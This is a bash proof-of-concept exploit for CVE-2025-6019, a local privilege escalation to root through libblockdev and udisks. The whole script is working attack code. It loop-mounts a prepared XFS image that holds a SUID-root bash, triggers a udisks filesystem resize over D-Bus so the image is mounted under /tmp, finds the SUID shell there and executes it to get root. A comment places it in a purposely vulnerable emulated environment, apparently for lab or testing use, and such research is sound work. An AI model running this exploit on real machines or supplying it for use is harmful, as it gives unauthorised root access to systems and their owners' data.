#!/bin/bash
# PoC for CVE-2025-6019: LPE from allow_active to root via libblockdev/udisks
# Fully functional in our purposely vulnerable, emulated environment.
set -e

IMAGE="./xfs.image"
if [ ! -f "$IMAGE" ]; then
    echo "Error: XFS image '$IMAGE' not found. Supply an image with a SUID-root shell." >&2
    exit 1
fi

# Stop any process that might auto-mount the image.
killall -q gvfs-udisks2-volume-monitor

echo "Setting up loop device from image..."
setup_output=$(udisksctl loop-setup --file "$IMAGE" --no-user-interaction)
echo "$setup_output"
loop_device=$(echo "$setup_output" | grep -o '/dev/loop[0-9]*')
if [ -z "$loop_device" ]; then
    echo "Failed to detect loop device." >&2
    exit 1
fi
echo "Loop device detected: $loop_device."

# Start a background process to keep the filesystem busy.
busy_loop() {
    while true; do
        sleep 1
    done
}
busy_loop &
busy_pid=$!
echo "Busy loop running (PID $busy_pid)."

echo "Triggering filesystem resize via gdbus..."
resize_output=$(gdbus call --system --dest org.freedesktop.UDisks2 \
              --object-path /org/freedesktop/UDisks2/block_devices/$(basename "$loop_device") \
              --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}')
echo "$resize_output"
sleep 3

# Find the temporary mount point created by libblockdev.
tmp_mount=$(find /tmp -maxdepth 1 -type d -name "blockdev.*" | head -n 1)
if [ -z "$tmp_mount" ]; then
    echo "Temporary mount point not found." >&2
    kill "$busy_pid"
    exit 1
fi
echo "Temporary mount point located at $tmp_mount."

# Search for the SUID-root shell within the mounted filesystem.
suid_shell=$(find "$tmp_mount" -type f -name "bash" -perm -4000 | head -n 1)
if [ -z "$suid_shell" ]; then
    echo "SUID-root shell not found in $tmp_mount." >&2
    kill "$busy_pid"
    exit 1
fi

echo "Found SUID-root shell: $suid_shell."
echo "Executing SUID-root shell..."
kill "$busy_pid"
exec "$suid_shell" -p